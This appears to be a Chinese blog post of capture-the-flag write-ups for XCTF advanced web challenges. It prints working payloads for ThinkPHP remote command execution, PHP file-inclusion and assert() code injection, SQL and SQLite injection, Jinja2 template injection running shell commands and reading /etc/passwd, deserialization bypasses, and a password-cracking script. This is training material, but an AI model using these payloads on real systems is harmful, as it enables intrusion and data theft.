title: 攻防世界web进阶区刷题记录
author: bmth
tags:
  - 刷题笔记
  - CTF
categories: []
img: 'https://img-blog.csdnimg.cn/20210304211906505.png'
date: 2020-11-01 15:33:00
---
## baby_web
**提示是：想想初始页面是哪个**
进入是一个hello world，然后就没有了，由于提示试试抓包，得到flag
![](https://img-blog.csdnimg.cn/20200322202753441.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
## Training-WWW-Robots
由于提示我们就查看robots.txt
![](https://img-blog.csdnimg.cn/20200322202936761.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
获得flag
![](https://img-blog.csdnimg.cn/20200322203008445.png)
## php_rce
题目很明显的提示了：ThinkPHP V5
![](https://img-blog.csdnimg.cn/20200322202028621.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
上网找到相应的漏洞利用，这里我找的是：[ThinkPHP 5.x远程命令执行漏洞分析与复现](https://www.cnblogs.com/backlion/p/10106676.html)
`?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami`
发现可行，执行了whoami，那么就很简单了
![](https://img-blog.csdnimg.cn/20200322202215674.png)
cat /flag一下`?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat /flag`
![](https://img-blog.csdnimg.cn/20200322202355470.png)

## Web_php_include
给出了源码：
```php
<?php
show_source(__FILE__);
echo $_GET['hello'];
$page=$_GET['page'];
while (strstr($page, "php://")) {
    $page=str_replace("php://", "", $page);
}
include($page);
?>
```
![](https://img-blog.csdnimg.cn/20200322203614198.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
过滤了php://，但方法很多
### 方法1：大小写绕过
没有过滤Php://，可大写绕过
`?page=Php://input`POST方式提交`<?php system("ls"); ?>`
![](https://img-blog.csdnimg.cn/20200322205228978.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
然后执行cat即可
![](https://img-blog.csdnimg.cn/20200322205255955.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
### 方法2：php文件包含
php文件包含
`?page=http://127.0.0.1/index.php/?hello=<?system('ls');?>`
![](https://img-blog.csdnimg.cn/2020032220574682.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
`?page=http://127.0.0.1/index.php/?hello=<?show_source("fl4gisisish3r3.php");?>`
![](https://img-blog.csdnimg.cn/20200322210200460.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
### 方法3：伪协议
使用其他的伪协议data://text/plain
首先获取路径`?page=data://text/plain,<?php echo $_SERVER['DOCUMENT_ROOT'];?>`
![](https://img-blog.csdnimg.cn/20200322210635603.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
读取当前目录的文件`?page=data://text/plain,<?php print_r(scandir('/var/www'));?>`
![](https://img-blog.csdnimg.cn/20200322210947200.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
最后读取文件即可`?page=data://text/plain,<?php $a=file_get_contents('fl4gisisish3r3.php'); echo htmlspecialchars($a);?>`
![](https://img-blog.csdnimg.cn/20200322212008950.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
## warmup
打开是一个滑稽，查看源码得到source.php查看得到源代码
```php
 <?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {
                return true;
            }

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }

    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?> 
```
![](https://img-blog.csdnimg.cn/20200322212910764.png)
第一个if是对$page变量进行检验，要求是字符串，否则的话返回false，

第二个if是判断\$page是否在规定的白名单数组里面；如果在的话返回true；接着截取\$page的 ? 之前的内容进行查看，判断其是否在$whitelist中，如果在的话，返回true，不在的话返回false；然后对\$page进行url解码，解码之后再继续截取 ? 之前的内容，判断是否在$whitelist数组之中，如果在的话返回true，否则返回false；都通过以后，就会包含file；

这里我们构造payload `?file=source.php?../../../../../../ffffllllaaaagggg`(因为我们不知道具体的位置，所以我们只能目录跃迁进行尝试)然后得到flag
![](https://img-blog.csdnimg.cn/20200322213258508.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
参考：[[HCTF 2018]WarmUp](https://www.cnblogs.com/Wanghaoran-s1mple/p/12465770.html)
## NewsCenter
没有过滤的sql注入，直接union select即可

```sql
得到news：
' and 0 union select 1,database(),3# 
得到secret_table:
' and 0 union select 1,table_schema,table_name from information_schema.columns #
得到fl4g：
' and 0 union select 1,2,column_name from information_schema.columns where table_name='secret_table'#
得到flag：
' and 0 union select 1,2,fl4g from secret_table #
```
![](https://img-blog.csdnimg.cn/20200322215005964.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
## NaNNaNNaNNaN-Batman
下载附件，发现是js代码，但很混乱，发现最后有个eval()函数执行行了前面的_函数，将eval()改为alert()，改为.html即可弹出源代码
![](https://img-blog.csdnimg.cn/202003231522379.png)
整理后得：
```javascript
function $() {
    var e = document.getElementById("c").value;
    if (e.length == 16) if (e.match(/^be0f23/) != null) if (e.match(/233ac/) != null) if (e.match(/e98aa$/) != null) if (e.match(/c7be9/) != null) {
        var t = ["fl", "s_a", "i", "e}"];
        var n = ["a", "_h0l", "n"];
        var r = ["g{", "e", "_0"];
        var i = ["it'", "_", "n"];
        var s = [t, n, r, i];
        for (var o = 0; o < 13; ++o) {
            document.write(s[o % 4][0]);
            s[o % 4].splice(0, 1)
        }
    }
}
document.write('<input id="c"><button onclick=$()>Ok</button>');
delete _
```
将数组拼接起来即是flag：`flag{it's_a_h0le_in_0ne}`
或者运行js代码得到一个弹窗，输入数字要满足条件如下：
1. 长度为16
2. 以be0f23开头
3. 以e98aa结尾
4. 包含233ac
5. 包含c7be9

得到be0f233ac7be98aa，输入得到flag
![](https://img-blog.csdnimg.cn/20200323153657234.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
## PHP2
打开得到：__Can you anthenticate to this website?__
想法就是，但扫描目录没得出来，查看wp发现是index.phps
![](https://img-blog.csdnimg.cn/20200323155012208.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
输入admin的两次url编码即可
`?id=%2561%2564%256d%2569%256e`
![](https://img-blog.csdnimg.cn/2020032315521977.png)
## unserialize3
得到一串代码：
```javascript
class xctf{
public $flag = '111';
public function __wakeup(){
exit('bad requests');
}
?code=
```
构造序列化，只存在一个变量flag
`?code=O:4:"xctf":1:{s:4:"flag";s:3:"111";}`
又要绕过__wakeup()，将1改为2即可
`?code=O:4:"xctf":2:{s:4:"flag";s:3:"111";}`
![](https://img-blog.csdnimg.cn/20200323160323649.png)
## upload1
查看源代码得：
```php
function check(){
upfile = document.getElementById("upfile");
submit = document.getElementById("submit");
name = upfile.value;
ext = name.replace(/^.+\./,'');

if(['jpg','png'].contains(ext)){
	submit.disabled = false;
}else{
	submit.disabled = true;

	alert('请选择一张图片文件上传!');
}

}
```
前端js检验，抓包绕过，首先上传jpg
![](https://img-blog.csdnimg.cn/20200323173604292.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
蚁剑连接即可得到flag
![](https://img-blog.csdnimg.cn/20200323173846900.png)

## Web_python_template_injection
进入题目提示：**python template injection**，这个点不会，看了wp
执行
```python
{{7*7}}
```
![](https://img-blog.csdnimg.cn/20200323175926993.png)
可行，那么就可以读取数据了，读取/etc/password
```python
{{ [].__class__.__base__.__subclasses__()[40]('/etc/passwd').read() }}
```
![](https://img-blog.csdnimg.cn/20200323180145846.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
首先执行ls命令
```python
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}  
  {% if b.__class__ == {}.__class__ %}         //遍历基类 找到eval函数
    {% if 'eval' in b.keys() %}    //找到了
      {{ b['eval']('__import__("os").popen("ls").read()') }}  //导入cmd 执行popen里的命令 read读出数据
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}
```
![](https://img-blog.csdnimg.cn/20200323180335383.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
得到了fl4g，那么cat一下就可以了，`将ls改为cat fl4g`
![](https://img-blog.csdnimg.cn/20200323180546774.png)
看了另一个师傅的，代码简单很多：
```python
{{[].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].popen("ls").read()}}
{{[].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].popen("cat fl4g").read()}}
```
方法很多，不拘于一种方法最好
参考：
[攻防世界WEB高手进阶之python_template_injection](https://www.cnblogs.com/mke2fs/p/11523005.html)
[[WP]Web>Python>template>注入,wpWebpythontemplateinjection,攻防,世界
](https://www.pythonf.cn/read/3573)

## Web_php_unserialize
反序列化的题目，给出了源码
```php
<?php 
class Demo { 
    private $file = 'index.php';
    public function __construct($file) { 
        $this->file = $file; 
    }
    function __destruct() { 
        echo @highlight_file($this->file, true); 
    }
    function __wakeup() { 
        if ($this->file != 'index.php') { 
            //the secret is in the fl4g.php
            $this->file = 'index.php'; 
        } 
    } 
}
if (isset($_GET['var'])) { 
    $var = base64_decode($_GET['var']); 
    if (preg_match('/[oc]:\d+:/i', $var)) { 
        die('stop hacking!'); 
    } else {
        @unserialize($var); 
    } 
} else { 
    highlight_file("index.php"); 
} 
?>
```
主要绕过两个地方：
1. preg_match(’/[oc]:\d+:/i’, $var)的绕过
2. unserialize时__wakeup的绕过

 绕过正则：使用+可以绕过preg_match() 正则匹配这里匹配的是 O:4，我们用 O:+4 即可绕过
 绕过wakeup：使序列化字符串中标识变量数量的值大于实际变量即可，即1变为2
在下面添加如下代码构造序列化即可：
```php
    $A = new Demo('fl4g.php');
    $C = serialize($A);
    //string(49) "O:4:"Demo":1:{s:10:"Demofile";s:8:"fl4g.php";}"
    $C = str_replace('O:4', 'O:+4',$C);//绕过preg_match
    $C = str_replace(':1:', ':2:',$C);//绕过wakeup
    var_dump($C);
    //string(49) "O:+4:"Demo":2:{s:10:"Demofile";s:8:"fl4g.php";}"
    var_dump(base64_encode($C));
    //string(68) "TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ=="
```
![](https://img-blog.csdnimg.cn/20200325122808313.png)
传入可得到flag
![](https://img-blog.csdnimg.cn/20200325122956177.png)

## supersqli
强网杯的原题，直接使用payload
```sql
1'; handler `1919810931114514` open as y1ng; handler y1ng read first; handler y1ng close;#
```
![](https://img-blog.csdnimg.cn/20200325132243997.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)

## easytornado
一样是buuctf上做过的题目，直接上payload
```python
?msg={{1*2}}
```
![](https://img-blog.csdnimg.cn/20200325132852888.png)
获得cookie：
```python
?msg={{handler.settings}}
```
![](https://img-blog.csdnimg.cn/20200325132939910.png)
得到ead3e90c-a620-4f9c-afd5-824276d245ba，使用python脚本：

```python
import hashlib
hash = hashlib.md5()

filename='/fllllllllllllag'
cookie_secret="ead3e90c-a620-4f9c-afd5-824276d245ba"
hash.update(filename.encode('utf-8'))
s1=hash.hexdigest()
hash = hashlib.md5()
hash.update((cookie_secret+s1).encode('utf-8'))
print(hash.hexdigest())
```

![](https://img-blog.csdnimg.cn/20200325133426869.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
最后`file?filename=/fllllllllllllag&filehash=f99dedfcd23ec0411f0727c8ade108c4`
![](https://img-blog.csdnimg.cn/20200325133549340.png)

## ics-06
题目描述：云平台报表中心收集了设备管理基础服务的数据，但是数据被删除了，只有一处留下了入侵者的痕迹。
点进去什么都没有，就只有点报表中心得出
![](https://img-blog.csdnimg.cn/20200325134129544.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
送分题。。。。尝试了sql注入没反应，看wp发现爆破id即可，那么就开始抓包爆破了，数据从1设到10000，爆出了id=2333时不同
![](https://img-blog.csdnimg.cn/20200325134650799.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
访问得到flag
![](https://img-blog.csdnimg.cn/20200325134730913.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
## lottery
界面还蛮有意思的，得到flag要$9990000，要两次得到7个一样的数字
![](https://img-blog.csdnimg.cn/20200325135111114.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
查看wp才发现是git泄露，那么就直接开始githack了
![](https://img-blog.csdnimg.cn/20200325135835528.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
接下来代码审计，猜数字的在api.php中，有一个弱类型，bool类型的true是可以和任何数据弱类型相等的
![](https://img-blog.csdnimg.cn/20200325140234521.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
那么就开始抓包把数据都改为true即可，注意当生成的win_number中不含0时才会得5000000
`{"action":"buy","numbers":[true,true,true,true,true,true,true]}`
![](https://img-blog.csdnimg.cn/20200325141049521.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
最后刷到足够的钱，买flag就行了
![](https://img-blog.csdnimg.cn/20200325141408156.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
参考：[攻防世界-Web-lottery(.git泄露、php源码审计、弱类型利用)-XCTF 4th-QCTF-2018](https://blog.csdn.net/zz_caleb/article/details/89544725)
## mfw
首先发现有git泄露，直接可以得到源码
![](https://img-blog.csdnimg.cn/20200325202945337.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
好吧，打开乱码，还是用githack得到index.php的源码：
```php
<?php

if (isset($_GET['page'])) {
	$page = $_GET['page'];
} else {
	$page = "home";
}

$file = "templates/" . $page . ".php";

// I heard '..' is dangerous!
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");

// TODO: Make this look nice
assert("file_exists('$file')") or die("That file doesn't exist!");
?>
```
**assert()函数会将读入的代码当做PHP代码来执行**
1. 首先对strpos函数进行闭合，构造：`?page=')`
2. 可以把后面`', '..') === false`的给注释掉，构造：`?page=').phpinfo();//`
3. 或者不注释也行，直接插入，构造`?page='.phpinfo().'`

![](https://img-blog.csdnimg.cn/20200325204356214.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
那么就可以使用system()来执行语句了
`?page='.system("ls").'`
![](https://img-blog.csdnimg.cn/20200325204623846.png)
`?page='.system("cat templates/flag.php").'`,查看源码得到flag
![](https://img-blog.csdnimg.cn/20200325204814409.png)
参考：[XCTF WEB mfw](https://blog.csdn.net/qq_42967398/article/details/90758521)

## web2
给出了源码：
```php
<?php
$miwen="a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws";

function encode($str){
    $_o=strrev($str); //反转字符串
    // echo $_o;
        
    for($_0=0;$_0<strlen($_o);$_0++){//循环字符串长度
       
        $_c=substr($_o,$_0,1); //从$_0位置开始，返回1个字符
        $__=ord($_c)+1;
        $_c=chr($__);
        $_=$_.$_c;   //拼接两个变量的内容 赋值
    } 
    return str_rot13(strrev(base64_encode($_)));//返回  ROT13 编码/解码(反转字符串(base64加密($_)))
}

highlight_file(__FILE__);
/*
   逆向加密算法，解密$miwen就是flag
*/
?> 
```
逆向解密即可，这里借鉴了师傅的代码：
```php
<?php
$str='a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws';
$_ = base64_decode(strrev(str_rot13($str)));

$_o=NULL;
for($_0=0;$_0<strlen($_);$_0++){  
       
        $_c=substr($_,$_0,1);  

        $__=ord($_c)-1;  

        $_c=chr($__);  

        $_o=$_o.$_c;   
    } 
echo strrev($_o);
?>
```
![](https://img-blog.csdnimg.cn/20200325210325224.png)
参考：[攻防世界 web 进阶 web2](https://blog.csdn.net/weixin_42499640/article/details/99102049)

## FlatScience
一脸懵逼，不知所云，查看wp，首先查看robots.txt
![](https://img-blog.csdnimg.cn/20200327183624241.png)
那么就访问试试，发现在login.php加'得到报错信息，数据库是sqlite
![](https://img-blog.csdnimg.cn/2020032718401142.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
查看源码得到hint，那么加上`?debug`，得到源码
![](https://img-blog.csdnimg.cn/20200327184314241.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
```php
<?php
if(isset($_POST['usr']) && isset($_POST['pw'])){
        $user = $_POST['usr'];
        $pass = $_POST['pw'];

        $db = new SQLite3('../fancy.db');
        
        $res = $db->query("SELECT id,name from Users where name='".$user."' and password='".sha1($pass."Salz!")."'");
    if($res){
        $row = $res->fetchArray();
    }
    else{
        echo "<br>Some Error occourred!";
    }

    if(isset($row['id'])){
            setcookie('name',' '.$row['name'], time() + 60, '/');
            header("Location: /");
            die();
    }

}

if(isset($_GET['debug']))
highlight_file('login.php');
?> 
```
sql注入点位于query函数，sql反馈点位于setcookie函数。需要注意的是：password是和salt 'Salz!' 拼接之后经过一个sha1哈希才传入查询逻辑的，这也就意味着数据库中“password”表项存放的是密码加盐之后的哈希值。

通过查询其全局模式表sqlite_master（存放本数据库所有表、视图、索引、触发器等的定义）可找到用户表的sql定义。
`user='union select name,sql from sqlite_master --`(sqlite注释符是'- -')
![](https://img-blog.csdnimg.cn/20200327222450484.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
得到Set-Cookie：
```sql
CREATE TABLE Users(
id int primary key,
name varchar(255),
password varchar(255),
hint varchar(255)
)
```
那么就要得到id、name、password、hint：
`usr=%27 UNION SELECT id, name from Users limit 0,1--`
![](https://img-blog.csdnimg.cn/20200327223154573.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
`usr=%27 UNION SELECT id, password from Users limit 0,1--`
![](https://img-blog.csdnimg.cn/20200327223245146.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
`usr=%27 UNION SELECT id, hint from Users limit 0,1--`
![](https://img-blog.csdnimg.cn/20200327223435593.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
登陆的话应该需要利用sha1函数和salt找出密码，密码就藏在教授的论文中，所以我们需要爬取站点所有pdf并转换为txt，逐一比对进行爆破
使用师傅脚本爬取pdf：
```python
import urllib.request
import re

allHtml=[]
count=0
pat_pdf=re.compile("href=\"[0-9a-z]+.pdf\"")
pat_html=re.compile("href=\"[0-9]/index\.html\"")


def my_reptile(url_root,html):
	global pat_pdf
	global pat_html
	html=url_root+html
	
	if(isnew(html)):
		allHtml.append(html)
		
		print("[*]starting to crawl site:{}".format(html))
		with urllib.request.urlopen(html) as f:
			response=f.read().decode('utf-8')
			
		pdf_url=pat_pdf.findall(response)
		for p in pdf_url:
			p=p[6:len(p)-1]
			download_pdf(html+p)
			
		html_url=pat_html.findall(response)
		for h in html_url:
			h=h[6:len(h)-11]
			my_reptile(html,h)
		
def download_pdf(pdf):
	global count
	
	fd=open(str(count)+'.pdf','wb')
	count+=1
	
	print("[+]downloading pdf from site:{}".format(pdf))
	with urllib.request.urlopen(pdf) as f:
		fd.write(f.read())
	fd.close()
	
def isnew(html):
	global allHtml
	for h in allHtml:
		if(html==h):
			return False
	return True


if __name__=="__main__":
	my_reptile("http://111.198.29.45:54969//",'')

```
![](https://img-blog.csdnimg.cn/20200327224429130.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
安装的时候经过多次报错，最终发现要安装的是pdfminer3k，推荐使用代理安装：
`pip3 install -i https://pypi.tuna.tsinghua.edu.cn/simple pdfminer3k`
把pdf转化为txt脚本：
```python
from pdfminer.pdfparser import PDFParser,PDFDocument
from pdfminer.pdfinterp import PDFResourceManager, PDFPageInterpreter
from pdfminer.converter import PDFPageAggregator
from pdfminer.layout import LTTextBoxHorizontal,LAParams
from pdfminer.pdfinterp import PDFTextExtractionNotAllowed
import os

def pdf2txt(pdfFile,txtFile):
	print('[+]converting {} to {}'.format(pdfFile,txtFile))
	
	fd_txt=open(txtFile,'w',encoding='utf-8')
	fd_pdf=open(pdfFile,'rb')
	
	parser=PDFParser(fd_pdf)
	doc=PDFDocument()
	parser.set_document(doc)
	doc.set_parser(parser)
	doc.initialize()
	
	manager=PDFResourceManager()
	laParams=LAParams()
	device=PDFPageAggregator(manager,laparams=laParams)
	interpreter=PDFPageInterpreter(manager,device)
	
	for page in doc.get_pages():
		interpreter.process_page(page)
		layout=device.get_result()
		
		for x in layout:
			if(isinstance(x,LTTextBoxHorizontal)):
				fd_txt.write(x.get_text())
				fd_txt.write('\n')
	fd_pdf.close()
	fd_txt.close()
	print('[-]finished')
	
def crazyWork():
	print('[*]starting my crazy work')
	files=[]
	for f in os.listdir():
		if(f.endswith('.pdf')):
			files.append(f[0:len(f)-4])
	
	for f in files:
		pdf2txt(f+'.pdf',f+'.txt')
	
if __name__=='__main__':
	crazyWork()
```
![](https://img-blog.csdnimg.cn/20200328000533251.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
最后进行密码爆破，脚本如下：
```python
import os
import hashlib

def searchPassword():
	print('[*]starting to search the word')
	for file in os.listdir():
		if(file.endswith('.txt')):
			print('[+]searching {}'.format(file))
			with open(file,'r',encoding='utf-8') as f:
				for line in f:
					words=line.split(' ')
					for word in words:
						if(hashlib.sha1((word+'Salz!').encode('utf-8')).hexdigest()=='3fab54a50e770d830c0416df817567662a9dc85c'):
							print('[@]haha,i find it:{}'.format(word))
							exit()
							
if __name__=='__main__':
	searchPassword()
```
![](https://img-blog.csdnimg.cn/2020032800081642.png)
最后登录admin得到flag
![](https://img-blog.csdnimg.cn/20200328000932718.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
参考借鉴：
[攻防世界-web萌新-FlatScience(python处理pdf、sqlite注入)-Hack.lu-2017](https://blog.csdn.net/zz_caleb/article/details/89323133)
[[CTF题目总结-web篇]攻防世界：flatscience](https://blog.csdn.net/tch3430493902/article/details/103940495)

## Cat
一开始应该是一个ping命令，并且发现：
1. 正常 URL，返回 ping 结果
2. 非法 URL、特殊符号，返回 Invalid URL

![](https://img-blog.csdnimg.cn/20200328100939571.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
这里Django调试模式打开了，发现如果在输入框中值包含url编码，在?url=中请求大于%7F的字符都会造成Django报错。
在url中输入`?url=%80`,可以得到报错页面:
![](https://img-blog.csdnimg.cn/20200328103314592.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
得到信息：
```javascript
Request Method：POST
Request URL：http://127.0.0.1:8000/api/ping
Django Version：1.10.4
Exception Type：UnicodeEncodeError
Python Executable：/usr/bin/python
Python Version：2.7.12
```
是一个PHP调用Python的站，PHP通过CURL向django的站发送数据，那么就可以使用@进行文件传递，如果文件内容中有上述超出编码范围的字符，就会产生报错信息，实际上包含中文就会报错
ctrl+f搜索sql得到
![](https://img-blog.csdnimg.cn/20200328104222257.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
使用`?url=@/opt/api/database.sqlite3`
![](https://img-blog.csdnimg.cn/20200328104356309.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
